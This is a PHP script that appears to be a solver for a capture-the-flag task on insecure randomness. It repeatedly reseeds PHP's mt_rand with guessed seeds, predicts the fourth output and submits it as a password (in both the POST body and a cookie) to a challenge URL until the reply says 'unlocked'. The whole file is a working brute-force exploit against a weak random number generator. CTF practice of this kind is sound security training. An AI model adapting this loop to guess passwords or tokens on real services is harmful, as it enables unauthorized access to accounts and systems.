<?php

	echo " PwnerRank - CTF\n";
	echo " Task: PRNG - Insecure Randomness\n\n";

	$value = true;
	while ($value) {
		$handler = curl_init();
		curl_setopt($handler, CURLOPT_URL, "http://web.challenges.pwnerrank.com/9df1d995cad1de2556a8cbfdc7527fdc/index.php");
		curl_setopt($handler, CURLOPT_POST, 1);
		curl_setopt($handler, CURLOPT_RETURNTRANSFER, true);

		mt_srand((rand(1, pow(10,4)) ^ microtime()) % rand(1, pow(10,4)) + rand(1, pow(10,4)));

		for ($i=0; $i<3; $i++) mt_rand (0, 0xffffff);

		$password = mt_rand (0, 0xffffff);
		curl_setopt($handler, CURLOPT_POSTFIELDS, "password=$password");
		curl_setopt($handler, CURLOPT_COOKIE, "password=$password");
		$server_output = curl_exec($handler);

		if ($server_output) {
			$str_ret = strpos($server_output, "Wrong");
			if ($str_ret) {
				echo ".";
				/* echo " [-] Wrong password!\n"; */
			} else {
				$str_ret = strpos($server_output, "unlocked");
				if ($str_ret) {
					echo " [+] Password find!!!: \n";
					var_dump($server_output);
					$value = false;
				}
			}
		}

		curl_close ($handler);
	}
?>
